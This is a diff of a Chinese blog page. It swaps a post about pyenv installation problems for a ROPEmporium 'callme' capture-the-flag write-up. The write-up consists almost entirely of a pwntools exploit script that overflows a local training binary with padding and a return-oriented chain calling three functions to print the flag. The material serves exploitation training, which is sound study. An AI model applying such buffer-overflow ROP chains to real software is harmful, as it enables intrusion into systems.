@@ -16,13 +16,12 @@
 
   <!-- 页面元数据 -->
   
-    <title>Pyenv相关安装问题 - 192&#39;s blog</title>
+    <title>ROPEmporium callme - 192&#39;s blog</title>
   
-    <meta name="keywords" content="pyenv">
+    <meta name="keywords" content="ROPEmporium,callme">
   
   
-    <meta name="description" content="pyenv相关安装问题1. pyenv install 下载慢1. 代理命令行可以用proxychains-ng
-2.  ~/.pyenv/cache将要安装的版本的.gz包从官网下载之后放进~/.pyenv/cache再pyenv install就可以安装了">
+    <meta name="description" content="Callme这个题没什么好说的。直接找gadget进行构造就行了。">
   
 
   <!-- feed -->
@@ -420,8 +419,8 @@
           
   
     <h1 class="title">
-      <a href="/2020/04/09/pyenv%E7%9B%B8%E5%85%B3%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/">
-        Pyenv相关安装问题
+      <a href="/2020/04/17/callme/">
+        ROPEmporium callme
       </a>
     </h1>
   
@@ -447,9 +446,9 @@
               
   
   <div class='new-meta-item category'>
-    <a href='/categories/config/' rel="nofollow">
+    <a href='/categories/PWN/' rel="nofollow">
       <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <p>config</p>
+      <p>PWN</p>
     </a>
   </div>
 
@@ -460,7 +459,7 @@
               <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2020年4月9日</p>
+    <p>发布于：2020年4月17日</p>
   </a>
 </div>
 
@@ -483,15 +482,15 @@
       <section class="article typo">
         <div class="article-entry" itemprop="articleBody">
           
-          <h2 id="pyenv相关安装问题"><a href="#pyenv相关安装问题" class="headerlink" title="pyenv相关安装问题"></a>pyenv相关安装问题</h2><h3 id="1-pyenv-install-下载慢"><a href="#1-pyenv-install-下载慢" class="headerlink" title="1. pyenv install 下载慢"></a>1. pyenv install 下载慢</h3><h4 id="1-代理"><a href="#1-代理" class="headerlink" title="1. 代理"></a>1. 代理</h4><p>命令行可以用<strong><em>proxychains-ng</em></strong></p>
-<h4 id="2-pyenv-cache"><a href="#2-pyenv-cache" class="headerlink" title="2.  ~/.pyenv/cache"></a>2.  ~/.pyenv/cache</h4><p>将要安装的版本的.gz包从官网下载之后放进<code>~/.pyenv/cache</code>再pyenv install就可以安装了</p>
+          <h2 id="Callme"><a href="#Callme" class="headerlink" title="Callme"></a>Callme</h2><p>这个题没什么好说的。直接找gadget进行构造就行了。</p>
 <a id="more"></a>
 
+<p><strong>环境：</strong> ubuntu18.04 、 pwntools(py3)</p>
+<p><strong>exp.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'callme'</span>) <span class="comment">#文件名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#info('%#X system', elf.symbols.system)</span></span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line">gadget = p64(<span class="number">0x401ab0</span>)</span><br><span class="line"></span><br><span class="line">ca_one = p64(<span class="number">0x401850</span>)</span><br><span class="line">ca_two = p64(<span class="number">0x401870</span>)</span><br><span class="line">ca_thr = p64(<span class="number">0x401810</span>)</span><br><span class="line">ret_ad = p64(<span class="number">0x401ab3</span>)</span><br><span class="line"></span><br><span class="line">arg_st = p64(<span class="number">1</span>)</span><br><span class="line">arg_nd = p64(<span class="number">2</span>)</span><br><span class="line">arg_rd = p64(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">arg_al = arg_st + arg_nd + arg_rd</span><br><span class="line"></span><br><span class="line">callThem = ret_ad + gadget + arg_al</span><br><span class="line"><span class="comment"># ubuntu18.04一定要加ret_ad.否则system函数出错会打印不出来flag</span></span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">'A'</span>,<span class="string">'latin-1'</span>) * <span class="number">40</span> <span class="comment"># padding</span></span><br><span class="line">payload += callThem</span><br><span class="line">payload += ca_one</span><br><span class="line">payload += callThem</span><br><span class="line">payload += ca_two</span><br><span class="line">payload += callThem</span><br><span class="line">payload += ca_thr</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">flag = io.recvall()</span><br><span class="line">print(<span class="string">'FLAG: '</span> + str(flag,<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://i.loli.net/2020/04/17/d9ubTipt3MagkC8.png" alt="image-20200417214303357"></p>
 
-<h3 id="2-依赖"><a href="#2-依赖" class="headerlink" title="2. 依赖"></a>2. 依赖</h3><h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install make build-essential libssl-dev zlib1g-dev</span><br><span class="line">sudo apt-get install libbz2-dev libreadline-dev libsqlite3-dev wget curl</span><br><span class="line">sudo apt-get install llvm libncurses5-dev libncursesw5-dev</span><br></pre></td></tr></table></figure>
-
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
           
             <br>
             
@@ -520,7 +519,7 @@
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/pyenv/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>pyenv</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ROPEmporium/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ROPEmporium</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/callme/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>callme</p></a></div>
 
 
         
@@ -538,8 +537,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
           
-          href="http://connect.qq.com/widget/shareqq/index.html?url=http://ftosims.github.io/2020/04/09/pyenv%E7%9B%B8%E5%85%B3%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/&title=Pyenv相关安装问题 - 192's blog&summary=pyenv相关安装问题1. pyenv install 下载慢1. 代理命令行可以用proxychains-ng
-2.  ~/.pyenv/cache将要安装的版本的.gz包从官网下载之后放进~/.pyenv/cache再pyenv install就可以安装了"
+          href="http://connect.qq.com/widget/shareqq/index.html?url=http://ftosims.github.io/2020/04/17/callme/&title=ROPEmporium callme - 192's blog&summary=Callme这个题没什么好说的。直接找gadget进行构造就行了。"
           
           >
           
@@ -551,8 +549,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
           
-          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://ftosims.github.io/2020/04/09/pyenv%E7%9B%B8%E5%85%B3%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/&title=Pyenv相关安装问题 - 192's blog&summary=pyenv相关安装问题1. pyenv install 下载慢1. 代理命令行可以用proxychains-ng
-2.  ~/.pyenv/cache将要安装的版本的.gz包从官网下载之后放进~/.pyenv/cache再pyenv install就可以安装了"
+          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://ftosims.github.io/2020/04/17/callme/&title=ROPEmporium callme - 192's blog&summary=Callme这个题没什么好说的。直接找gadget进行构造就行了。"
           
           >
           
@@ -564,8 +561,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
           
-          href="http://service.weibo.com/share/share.php?url=http://ftosims.github.io/2020/04/09/pyenv%E7%9B%B8%E5%85%B3%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/&title=Pyenv相关安装问题 - 192's blog&summary=pyenv相关安装问题1. pyenv install 下载慢1. 代理命令行可以用proxychains-ng
-2.  ~/.pyenv/cache将要安装的版本的.gz包从官网下载之后放进~/.pyenv/cache再pyenv install就可以安装了"
+          href="http://service.weibo.com/share/share.php?url=http://ftosims.github.io/2020/04/17/callme/&title=ROPEmporium callme - 192's blog&summary=Callme这个题没什么好说的。直接找gadget进行构造就行了。"
           
           >
           
@@ -589,17 +585,23 @@
         
           <div class="prev-next">
             
-              <a class='prev' href='/2020/04/09/Pwnable%20fd/'>
-                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Pwnalbe.kr C1.fd WP</p>
-                <p class='content'>Pwnalbe.kr C1.fd WP
+              <a class='prev' href='/2020/04/18/write4/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>ROPEmporium write4</p>
+                <p class='content'>z这个challenge的主要点是将数据写入内存再把内存地址传递给rdi。
 
 
 
 
-
-123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;st...</p>
+环境： ubuntu18.04 、 pwntools(py3)
+EXP
+1234567891011121314...</p>
               </a>
             
+            
+              <a class='next' href='/2020/04/16/split/'>
+                <p class='title'>ROPEmporium split<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>split上一次的坑这一次碰到了，ROPEmporium ret2win里面说当时函数无法成功运行，搜索的结果是十六进制对齐的问题。在那个问题里因为限定了读取的长度为50，而要进行对其至少要40...</p>
+              </a>
             
           </div>
         
@@ -626,7 +628,7 @@
 
   <script>
     window.subData = {
-      title: 'Pyenv相关安装问题',
+      title: 'ROPEmporium callme',
       tools: true
     }
   </script>
@@ -652,7 +654,7 @@
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pyenv相关安装问题"><span class="toc-text">pyenv相关安装问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-pyenv-install-下载慢"><span class="toc-text">1. pyenv install 下载慢</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-代理"><span class="toc-text">1. 代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-pyenv-cache"><span class="toc-text">2.  ~&#x2F;.pyenv&#x2F;cache</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-依赖"><span class="toc-text">2. 依赖</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ubuntu"><span class="toc-text">ubuntu</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-text"></span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Callme"><span class="toc-text">Callme</span></a></li></ol>
     </div>
   </section>
 
